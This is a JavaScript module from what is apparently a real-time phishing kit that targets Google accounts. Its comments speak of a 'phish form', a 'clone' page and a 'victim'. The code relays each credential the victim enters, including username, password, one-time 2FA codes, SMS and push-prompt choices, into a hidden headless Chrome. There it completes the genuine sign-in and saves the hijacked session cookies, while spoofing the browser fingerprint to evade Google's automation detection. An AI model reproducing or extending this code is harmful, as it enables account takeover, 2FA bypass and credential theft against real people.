import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { authenticator } from 'otplib';
import { getSecrets } from './store.js';
import { classifyState, extractError, ERROR_SELECTORS, WRONG_PW_MSG } from './google-state.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');

// id -> { context, page }
const active = new Map();

export function isOpen(id) {
  return active.has(id);
}

export function activeIds() {
  return [...active.keys()];
}

function userDataDir(id) {
  const dir = path.join(SESSIONS_DIR, id);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// Headless is used for the silent wizard-driven login (no window popping up on
// the server when a remote user submits the phish form). Headed is used for the
// admin's explicit Open/Auto-login so 2FA / device challenges can be cleared by
// hand. The switch must happen at launch (persistent contexts can't toggle it).
async function launch(id, { headless = true } = {}) {
  const dir = userDataDir(id);
  // Real Chrome + these flags are what let Google's sign-in through:
  // - channel 'chrome': the real installed Chrome, most trusted fingerprint
  // - hide the automation banner/flag so navigator.webdriver is false
  // - headless (Chrome's new headless) is far less detectable than the old one,
  //   so silent wizard login stays under Google's radar without a visible window
  const baseOpts = {
    headless,
    viewport: null,
    // Google's sign-in flow serves a stripped-down "WebLiteSignIn" to anything it
    // suspects is automated — and rejects it as "browser or app may not be secure".
    // Headless Chrome also advertises a "HeadlessChrome" UA which Google distrusts.
    // Forcing a real Chrome desktop UA makes Google serve the FULL Glif flow and
    // accept the sign-in, which is what lets a no-2FA account actually log in.
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    ignoreDefaultArgs: ['--enable-automation'],
    args: [
      '--start-maximized',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
    ],
  };
  let context;
  try {
    context = await chromium.launchPersistentContext(dir, { ...baseOpts, channel: 'chrome' });
  } catch {
    context = await chromium.launchPersistentContext(dir, baseOpts);
  }
  // Google immediately rejects automated browsers ("this browser or app may not
  // be secure" -> /signin/rejected) unless we mask the driving marks. The
  // canonical fix is to override navigator.webdriver BEFORE any page script runs.
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });
  const page = context.pages()[0] || (await context.newPage());
  // headless flag: a persistent context can't toggle visibility after launch, so
  // callers that need a VISIBLE window must relaunch headed instead of reusing an
  // entry that was opened headless (e.g. a silent wizard login).
  const entry = { context, page, headless };
  active.set(id, entry);
  context.on('close', () => active.delete(id));
  return entry;
}

// ---------------------------------------------------------------------------
// Per-session lock. Every operation that drives a session's browser (open,
// login, wizard steps) is serialized per id, so out-of-order HTTP arrivals and
// double-clicks in the admin panel can never launch two Chrome instances on
// the same user-data dir (ProcessSingleton crash) or race each other.
// ---------------------------------------------------------------------------
const locks = new Map();
export function locked(id, fn) {
  const prev = locks.get(id) || Promise.resolve();
  const run = prev.then(() => fn());
  locks.set(id, run.catch(() => {})); // keep the chain alive even on failure
  return run;
}

// Open the session's browser (or focus it if already open) and navigate to a URL.
export function open(id, url, opts = {}) {
  return locked(id, () => openInner(id, url, opts));
}

async function openInner(id, url, opts = {}) {
  const wantHeadless = !!opts.headless;
  let entry = active.get(id);
  // If the session was previously opened HEADLESS (e.g. a silent wizard login left
  // it in `active`) and the caller now wants a VISIBLE window, we can't switch a
  // persistent context to headed in place — close it and relaunch headed. `close`
  // removes it from `active` via the 'close' handler so we get a clean launch.
  if (entry && entry.headless && !wantHeadless) {
    await entry.context.close().catch(() => {});
    entry = null;
  }
  if (!entry) entry = await launch(id, { headless: wantHeadless });
  if (url) {
    try {
      await entry.page.bringToFront();
      await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (e) {
      // navigation errors shouldn't kill the open browser
    }
  }
  return entry;
}

export async function close(id) {
  const entry = active.get(id);
  if (!entry) return false;
  try {
    await entry.context.close();
  } catch {}
  active.delete(id);
  return true;
}

export async function closeAll() {
  for (const id of [...active.keys()]) {
    // eslint-disable-next-line no-await-in-loop
    await close(id);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Resolve whatever TOTP value we were handed into the digits to type into Google:
// - a 6-digit numeric code (what a victim reads off their authenticator app or
//   the SMS they received) -> type it straight in, already valid for the window.
// - anything else (a Base32 "setup key" captured from the admin panel / invite)
//   -> generate the current rolling code from that secret.
function totpValue(secretOrCode) {
  const s = String(secretOrCode || '').trim();
  if (/^\d{6}$/.test(s)) return s;
  return s ? authenticator.generate(s.replace(/\s+/g, '')) : '';
}

// ---------------------------------------------------------------------------
// DOM signal collection + state classification.
// collectSignals() is the async Playwright side; classifyState() (in
// google-state.js) is the pure rules side. Together they replace the old
// detect2FA/assessLogin tangle.
// ---------------------------------------------------------------------------
const vis = (page, sel) =>
  page
    .locator(sel)
    .first()
    .isVisible()
    .catch(() => false);

async function collectSignals(page) {
  const [hasIdentifier, hasPassword, hasTotpPin, hasCodeInput, hasCaptcha] = await Promise.all([
    vis(page, '#identifierId, input[name="identifier"], input[type="email"]'),
    vis(page, 'input[type="password"]'),
    vis(page, 'input[name="totpPin"], input#totpPin'),
    vis(page, 'input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]'),
    vis(page, 'iframe[src*="recaptcha"], .g-recaptcha, iframe[src*="challenges"]'),
  ]);
  let heading = '';
  let bodyText = '';
  let buttons = [];
  let errorText = '';
  try {
    ({ heading, bodyText, buttons, errorText } = await page.evaluate((selectors) => {
      const h = document.querySelector('h1, h2');
      const out = {
        heading: h ? h.innerText.trim() : '',
        bodyText: (document.body ? document.body.innerText : '').slice(0, 2500),
        buttons: [],
        errorText: [],
      };
      out.buttons = [...document.querySelectorAll('button, [role="button"], input[type="submit"]')]
        .filter((b) => b.offsetParent !== null)
        .map((b) => (b.innerText || b.value || '').trim())
        .filter(Boolean)
        .slice(0, 40);
      for (const sel of selectors) {
        for (const el of document.querySelectorAll(sel)) {
          if (el.offsetParent !== null) out.errorText.push(el.innerText || '');
        }
      }
      out.errorText = out.errorText.join('\n').slice(0, 2000);
      return out;
    }, ERROR_SELECTORS));
  } catch {
    // page mid-navigation / closed — leave signals empty, classifier says 'unknown'
  }
  return { url: page.url(), hasIdentifier, hasPassword, hasTotpPin, hasCodeInput, hasCaptcha, heading, bodyText, buttons, errorText };
}

// DOM-based assessment of the real login state — "what is the real backend
// browser asking for right now?". The wizard front-end shows ONLY the step this
// reports, so the clone never invents a screen the genuine Google page isn't
// actually on. See google-state.js classifyState() for the full state list.
async function assessLogin(page) {
  return classifyState(await collectSignals(page));
}

// Scan the page for a recognizable Google account-level error (wrong password,
// unknown account, bad 2FA code...). Returns the trimmed error text or null.
async function findGoogleError(page) {
  try {
    const errorText = await page.evaluate((selectors) => {
      const out = [];
      for (const sel of selectors) {
        for (const el of document.querySelectorAll(sel)) {
          if (el.offsetParent !== null) out.push(el.innerText || '');
        }
      }
      return out.join('\n');
    }, ERROR_SELECTORS);
    return extractError(errorText);
  } catch {
    return null;
  }
}

// After submitting a password, wait for Google to either accept it (the password
// field disappears / the flow advances) or reject it (a real error appears).
// Never blindly advance on a wrong password. Returns { accepted } when we should
// move on, or { error } with the Google error text when it was rejected.
async function waitPasswordOutcome(page, pw, timeout) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    const err = await findGoogleError(page);
    if (err) return { error: err };
    if (!(await pw.isVisible().catch(() => false))) return { accepted: true };
    await sleep(500);
  }
  // Still on the password field and no error text surfaced => safest to treat it
  // as a bad password rather than silently continue to 2FA.
  return { error: WRONG_PW_MSG };
}

// After Google accepts a credential it can pass through a brief transition
// before the signed-in page renders. A single read taken in that window can
// LOOK like a challenge even though the account requires none. Keep watching
// until the state settles: if the real browser ever reaches signed-in, that is
// the truth and no 2FA was ever really required. Returns the settled result.
async function settleLogin(page, timeout = 8000) {
  const start = Date.now();
  let last = await assessLogin(page);
  if (last.status === 'logged-in' || last.status === 'error') return last;
  while (Date.now() - start < timeout) {
    const again = await assessLogin(page);
    if (again.status === 'logged-in' || again.status === 'error') return again;
    last = again; // totp/prompt/choice/sms/... — a genuine, persistent challenge
    await sleep(400);
  }
  return last;
}

// Admin-facing enrichment: the classifier messages are written for the victim
// (they're what the clone shows), so the headed admin flow appends the
// "what do I do" guidance only where it matters.
function adminHint(res) {
  if (res && res.code === 'rejected') {
    res = { ...res, message: 'Google blocked this automated sign-in ("this browser or app may not be secure"). Click Open and sign in by hand once — the session is then saved and reused.' };
  }
  return res;
}

// Best-effort assisted login. Pre-fills credentials in the persistent context.
// Returns { status, state, message, ... }. Leaves the browser OPEN so 2FA /
// challenges can be completed by hand when they can't be automated. `headless`
// defaults to true for the silent wizard login; the admin panel opens headed.
export function login(session, opts = {}) {
  return locked(session.id, () => loginInner(session, opts));
}

async function loginInner(session, opts = {}) {
  const secrets = getSecrets(session.id) || { password: '', totpSecret: '' };
  const entry = await openInner(session.id, undefined, { headless: opts.headless });
  const page = entry.page;

  if (session.provider === 'google') {
    return googleLogin(page, session, secrets);
  }

  // Generic provider: just navigate to the login URL for a manual sign-in.
  if (session.loginUrl) {
    try {
      await page.goto(session.loginUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch {}
  }
  return { status: 'new', state: 'password', message: 'Opened login page. Complete sign-in manually in the browser window.' };
}

async function googleLogin(page, session, secrets) {
  try {
    await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 });
    await sleep(2000);

    // already signed in?
    const pre = await assessLogin(page);
    if (pre.status === 'logged-in') return { status: 'logged-in', state: 'logged-in', message: 'Already signed in.' };
    if (pre.status === 'error') return adminHint(pre);

    // --- email ---
    const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
    if (await email.count()) {
      await email.first().fill(session.username);
      await clickNext(page, 'Next');
      await sleep(3500);
    }
    const afterEmail = await assessLogin(page);
    console.log(`[gsession] ${session.id} after email: ${afterEmail.status}/${afterEmail.state}`);
    if (afterEmail.status === 'error') return adminHint(afterEmail);
    // Some accounts skip the password entirely (passkey/SMS-only, Quick Check)
    // and go straight to a challenge — hand that screen through, don't wait.
    if (afterEmail.status === 'pending' && afterEmail.state !== 'unknown') return adminHint(afterEmail);

    // --- password ---
    const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
    await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
    if (await pw.count()) {
      if (!secrets.password) {
        return { status: 'new', state: 'password', message: 'No stored password. Finish signing in manually in the browser window.' };
      }
      await pw.first().fill(secrets.password);
      await clickNext(page, 'Next');
      // wait for authentication to accept the password — never advance on a wrong one
      const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
      console.log(`[gsession] ${session.id} password outcome: ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
      if (outcome.error) return { status: 'error', state: 'error', message: outcome.error };
    }

    // --- 2FA / TOTP (only if a code field is actually shown) ---
    const totp = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
    if ((await totp.count()) && secrets.totpSecret) {
      const code = totpValue(secrets.totpSecret);
      await totp.first().fill(code);
      await clickNext(page, 'Next');
      await sleep(4000);
      console.log(`[gsession] ${session.id} filled 2FA code from stored secret`);
    }

    return adminHint(await settleLogin(page));
  } catch (e) {
    return {
      status: 'error',
      state: 'error',
      message: `Auto-login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// ---------------------------------------------------------------------------
// Incremental "live" login. The remote wizard submits one credential at a time
// (username -> password -> 2FA/choice/send-code). Each submitted step drives
// the *real* Google sign-in forward in this session's persistent Chrome, so by
// the time the wizard is done the actual logged-in session (cookies, not a
// stored secret) already exists on disk under sessions/<id>/. Steps are
// serialized per session via `locked` so out-of-order HTTP arrivals can never
// race each other.
// ---------------------------------------------------------------------------
export function wizardPhase(key, id, value) {
  return locked(id, () => wizardPhaseInner(key, id, value));
}

async function wizardPhaseInner(key, id, value) {
  try {
    const page = (await openInner(id, undefined, { headless: true })).page;

    if (key === 'username') {
      await page
        .goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 })
        .catch(() => {});
      await sleep(1200);
      const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
      if (await email.count()) {
        await email.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // Watch the REAL browser move: report whichever genuine screen Google
        // lands on — password, 2FA, choice, prompt, logged-in, or an error.
        // Only 'email' (still typing) and 'unknown' (mid-transition) keep waiting.
        const start = Date.now();
        while (Date.now() - start < 10000) {
          const c = await assessLogin(page);
          if (c.state !== 'email' && c.state !== 'unknown') {
            console.log(`[gsession] ${id} username step -> ${c.state} (${c.status})`);
            return c;
          }
          await sleep(500);
        }
      }
      const res = await assessLogin(page);
      console.log(`[gsession] ${id} username step -> ${res.state}`);
      return res;
    }

    if (key === 'password') {
      const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
      await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await pw.count()) {
        await pw.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // wait for the real auth to accept — never continue on a wrong password
        const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
        console.log(`[gsession] ${id} password step -> ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
        if (outcome.error) return { status: 'error', state: 'error', message: outcome.error };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} password step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'totp') {
      const codeBox = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
      if ((await codeBox.count()) && value) {
        await codeBox.first().fill(totpValue(value));
        await clickNext(page, 'Next');
        await sleep(2000);
      }
      const err = await findGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} totp step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} totp step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'choice') {
      // Victim picked an option on the "choose how to confirm" clone
      // (e.g. "Text me a code") — click the same option in the real browser.
      const label = String(value || '').trim();
      const btn = page.getByRole('button', { name: label, exact: false }).first();
      if (await btn.count()) {
        await btn.click().catch(() => {});
        console.log(`[gsession] ${id} choice step -> clicked "${label}"`);
      }
      await sleep(2500);
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} choice step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'send-code') {
      // Victim pressed "Send code" on the "we'll text you" clone — do the same.
      const btn = page.getByRole('button', { name: /send code|text me|call me/i }).first();
      if (await btn.count()) {
        await btn.click().catch(() => {});
        console.log(`[gsession] ${id} send-code step -> clicked send`);
      }
      // wait for the code entry field to appear, then report the settled state
      await page
        .locator('input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]')
        .first()
        .waitFor({ state: 'visible', timeout: 15000 })
        .catch(() => {});
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} send-code step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    return settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      state: 'error',
      message: `Sign-in could not continue (${e.message}). Please try again.`,
    };
  }
}

// Re-evaluate the live state of a session's browser without driving it. Used by
// the wizard's waiting screens (prompt/passkey/captcha/unknown): the victim is
// tapping a phone notification / passkey prompt, and the clone polls this until
// the real browser moves on. Read-only — no lock, safe to run mid-phase.
export async function pollState(id) {
  const entry = active.get(id);
  if (!entry) return null;
  try {
    const page = entry.context.pages().find((p) => !p.isClosed()) || entry.page;
    return await assessLogin(page);
  } catch {
    return null;
  }
}

// Click Google's "Next"/submit: by id if present, else the visible button by
// its label, else just press Enter.
async function clickNext(page, labelText) {
  const byId = page.locator('#identifierNext, #passwordNext, #totpNext');
  if (await byId.count()) {
    await byId.first().click().catch(() => {});
    return;
  }
  try {
    const byRole = page.getByRole('button', { name: labelText, exact: false });
    if (await byRole.count()) {
      await byRole.first().click();
      return;
    }
  } catch {}
  await page.keyboard.press('Enter').catch(() => {});
}
